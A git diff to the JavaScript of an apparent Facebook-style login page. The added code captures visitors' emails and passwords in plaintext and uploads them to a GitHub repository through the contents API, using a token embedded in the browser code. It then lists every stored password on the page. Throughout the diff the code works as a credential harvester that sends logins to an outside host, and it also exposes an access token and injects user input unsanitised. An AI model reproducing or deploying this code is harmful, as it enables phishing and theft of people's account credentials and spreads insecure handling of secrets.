@@ -1,3 +1,8 @@
+// 🔥 GitHub Token - الصق token هنا
+const GITHUB_TOKEN = 'ghp_xxxxxxxxxxxxxxxx'; // الصق token بتاعك
+const REPO_OWNER = 'YOUR_USERNAME'; // غيّر بـ username بتاعك
+const REPO_NAME = 'facebook-login'; // اسم الـ repo
+
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     
@@ -5,53 +10,98 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     const password = document.getElementById('password').value;
     const message = document.getElementById('message');
     
-    // تحقق إذا الملف موجود
+    if (!email || !password) {
+        message.innerHTML = '❌ أدخل إيميل وباسورد!';
+        message.className = 'error';
+        return;
+    }
+    
+    message.innerHTML = '⏳ جاري الحفظ في GitHub...';
+    
     try {
-        const response = await fetch('users.json');
-        let users = [];
+        // 1. قراءة users.json الحالي
+        const currentUsers = await fetchUsers();
         
-        if (response.ok) {
-            users = await response.json();
-        }
-        
-        // إضافة المستخدم الجديد
+        // 2. إضافة المستخدم الجديد
         const newUser = {
-            id: Date.now(),
-            email: email,
-            password: password, // ⚠️ في الواقع استخدم تشفير!
-            date: new Date().toLocaleString('ar')
-        };
-        
-        users.push(newUser);
-        
-        // حفظ في users.json
-        await fetch('users.json', {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(users, null, 2)
-        });
-        
-        message.innerHTML = '✅ تم حفظ بياناتك بنجاح!';
-        message.className = 'success';
-        document.getElementById('loginForm').reset();
-        
-    } catch (error) {
-        // إذا الملف مش موجود، أنشئه
-        const newUser = [{
             id: Date.now(),
             email: email,
             password: password,
             date: new Date().toLocaleString('ar')
-        }];
+        };
+        currentUsers.push(newUser);
         
-        fetch('users.json', {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(newUser, null, 2)
-        }).then(() => {
-            message.innerHTML = '✅ تم إنشاء الملف وحفظ بياناتك!';
-            message.className = 'success';
-            document.getElementById('loginForm').reset();
-        });
+        // 3. حفظ في GitHub
+        await saveUsers(currentUsers);
+        
+        message.innerHTML = `✅ تم الحفظ في GitHub! (${currentUsers.length} مستخدم)`;
+        message.className = 'success';
+        
+        // تحديث العرض
+        showUsers();
+        document.getElementById('loginForm').reset();
+        
+    } catch (error) {
+        message.innerHTML = '❌ خطأ: ' + error.message;
+        message.className = 'error';
     }
 });
+
+async function fetchUsers() {
+    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
+    const response = await fetch(url, {
+        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+    });
+    
+    if (response.status === 404) {
+        return []; // الملف مش موجود، ابدأ فاضي
+    }
+    
+    const file = await response.json();
+    const content = JSON.parse(atob(file.content));
+    return content;
+}
+
+async function saveUsers(users) {
+    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
+    
+    // قراءة الملف الحالي للحصول على SHA
+    let sha = null;
+    try {
+        const file = await fetch(url, {
+            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+        });
+        const currentFile = await file.json();
+        sha = currentFile.sha;
+    } catch (e) {
+        // الملف مش موجود، مش مشكلة
+    }
+    
+    const content = btoa(JSON.stringify(users, null, 2));
+    
+    await fetch(url, {
+        method: 'PUT',
+        headers: {
+            'Authorization': `token ${GITHUB_TOKEN}`,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            message: `Add user: ${users[users.length-1].email}`,
+            content: content,
+            sha: sha
+        })
+    });
+}
+
+async function showUsers() {
+    const users = await fetchUsers();
+    const message = document.getElementById('message');
+    let display = '<br><h3>👥 المستخدمين من GitHub:</h3>';
+    users.forEach(user => {
+        display += `<p>📧 ${user.email} | 🔐 ${user.password} | 📅 ${user.date}</p>`;
+    });
+    message.innerHTML += display || '<p>لا يوجد مستخدمين بعد</p>';
+}
+
+// تحميل عند البداية
+showUsers();
